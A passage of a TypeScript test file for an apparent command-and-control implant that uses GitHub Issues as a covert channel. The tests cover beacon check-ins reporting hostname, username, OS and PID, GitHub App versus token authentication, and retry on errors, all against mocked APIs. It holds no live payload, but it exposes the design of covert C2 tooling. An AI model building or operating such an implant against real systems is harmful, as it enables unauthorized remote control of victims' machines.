  beforeEach(() => { mockHookWrap.mockClear(); });

  it("does NOT register hook.wrap when App credentials are absent (PAT mode)", () => {
    makeTentacle(); // PAT-only config
    expect(mockHookWrap.mock.calls.length).toBe(0);
  });

  it("registers hook.wrap('request', fn) when all three App fields are set", () => {
    new IssuesTentacle({
      id:   "550e8400-e29b-41d4-a716-446655440099",
      repo: { owner: "op", name: "c2" },
      token: "ghp_fallback",
      tentaclePriority: ["issues" as const],
      sleepSeconds: 60,
      jitter: 0.2,
      operatorPublicKey: new Uint8Array(32),
      beaconKeyPair: { publicKey: new Uint8Array(32), secretKey: new Uint8Array(32) },
      appId:          12345,
      installationId: 99999,
      appPrivateKey:  FAKE_PEM,
    });
    expect(mockHookWrap.mock.calls.length).toBe(1);
    expect(mockHookWrap.mock.calls[0]![0]).toBe("request");
  });

  it("does NOT register hook when only appId is set (partial config → PAT fallback)", () => {
    new IssuesTentacle({
      id:   "550e8400-e29b-41d4-a716-446655440099",
      repo: { owner: "op", name: "c2" },
      token: "ghp_fallback",
      tentaclePriority: ["issues" as const],
      sleepSeconds: 60,
      jitter: 0.2,
      operatorPublicKey: new Uint8Array(32),
      beaconKeyPair: { publicKey: new Uint8Array(32), secretKey: new Uint8Array(32) },
      appId: 12345,
      // installationId and appPrivateKey absent → PAT fallback
    });
    expect(mockHookWrap.mock.calls.length).toBe(0);
  });

  it("full checkin still succeeds when App config is present (hook is async-transparent)", async () => {
    // Set up mocks for a full checkin cycle
    const kp = await generateKeyPair();
    const pubB64 = await publicKeyToBase64(kp.publicKey);
    mockGetRepoVariable.mockResolvedValue({ data: { value: pubB64 } });
    mockListIssues.mockResolvedValue({ data: [] });
    mockCreateIssue.mockResolvedValue({ data: { number: 55 } });
    mockCreateComment.mockResolvedValue({ data: { id: 3001 } });
    mockListComments.mockResolvedValue({ data: [] });

    const tentacle = new IssuesTentacle({
      id:   "550e8400-e29b-41d4-a716-446655440088",
      repo: { owner: "op", name: "c2" },
      token: "ghp_fallback_pat",
      tentaclePriority: ["issues" as const],
      sleepSeconds: 60,
      jitter: 0.2,
      operatorPublicKey: new Uint8Array(32),
      beaconKeyPair: { publicKey: new Uint8Array(32), secretKey: new Uint8Array(32) },
      appId:          12345,
      installationId: 99999,
      appPrivateKey:  FAKE_PEM,
    });

    // Verify hook was registered
    expect(mockHookWrap.mock.calls.length).toBe(1);

    // The mock Octokit's hook.wrap is a no-op — API calls still go through the
    // mock REST methods. Full checkin should succeed exactly as in PAT mode.
    const tasks = await tentacle.checkin({
      beaconId: "550e8400-e29b-41d4-a716-446655440088",
      publicKey: pubB64,
      hostname: "testhost", username: "user",
      os: "linux", arch: "x64", pid: 1,
      checkinAt: new Date().toISOString(),
    });

    expect(Array.isArray(tasks)).toBe(true);
    expect(mockCreateIssue.mock.calls.length).toBe(1);
    expect(mockCreateComment.mock.calls.length).toBeGreaterThanOrEqual(1);
  });
});


describe("IssuesTentacle — init retry logic", () => {
  it("retries initialization after a transient error ages out", async () => {
    // Force a transient error on first init by making getRepoVariable fail with 500
    let callCount = 0;
    mockGetRepoVariable.mockImplementation(() => {
      callCount++;
      if (callCount === 1) {
        const err = new Error("Internal Server Error") as any;
        err.status = 500;
        return Promise.reject(err);
      }
      return Promise.resolve({ data: { value: "test-pubkey-val" } });
    });

    const t = makeTentacle();
    // Shorten the retry window for testing
    (IssuesTentacle as any).INIT_RETRY_MS = 50;

    // First init should fail with 500
    await expect(t.checkin({
      beaconId: "b1", publicKey: "pk", hostname: "h", username: "u",
      os: "linux", arch: "x64", pid: 1, checkinAt: new Date().toISOString(),
    })).rejects.toThrow("Internal Server Error");

    // Wait for retry window to elapse
    await new Promise(r => setTimeout(r, 100));

    // Second init should succeed now that the error has aged out
    // (Note: other parts of _initialize may still fail in this minimal mock setup,
    // but the key assertion is that initError is cleared and _initialize is called again)
    mockListIssues.mockImplementation(() => Promise.resolve({ data: [] }));
    mockCreateIssue.mockImplementation(() => Promise.resolve({ data: { number: 99 } }));
    mockCreateComment.mockImplementation(() => Promise.resolve({ data: { id: 2001 } }));

    // We expect this to at least reach the issue creation step (not throw the old 500)
    try {
      await t.checkin({
        beaconId: "b1", publicKey: "pk", hostname: "h", username: "u",
        os: "linux", arch: "x64", pid: 1, checkinAt: new Date().toISOString(),
      });
    } catch (err: any) {
      // If it fails, it should NOT be the original 500 error
      expect(err.message).not.toBe("Internal Server Error");
    }
  });

  it("does NOT retry fatal auth errors (401/403)", async () => {
    mockGetRepoVariable.mockImplementation(() => {
      const err = new Error("Bad credentials") as any;
      err.status = 401;
      return Promise.reject(err);
    });

    const t = makeTentacle();
    (IssuesTentacle as any).INIT_RETRY_MS = 50;

    await expect(t.checkin({
      beaconId: "b1", publicKey: "pk", hostname: "h", username: "u",
      os: "linux", arch: "x64", pid: 1, checkinAt: new Date().toISOString(),
    })).rejects.toThrow("Bad credentials");

    // Wait past retry window
    await new Promise(r => setTimeout(r, 100));

    // Should still throw the same fatal error
    await expect(t.checkin({
      beaconId: "b1", publicKey: "pk", hostname: "h", username: "u",
      os: "linux", arch: "x64", pid: 1, checkinAt: new Date().toISOString(),
    })).rejects.toThrow("Bad credentials");
  });
});
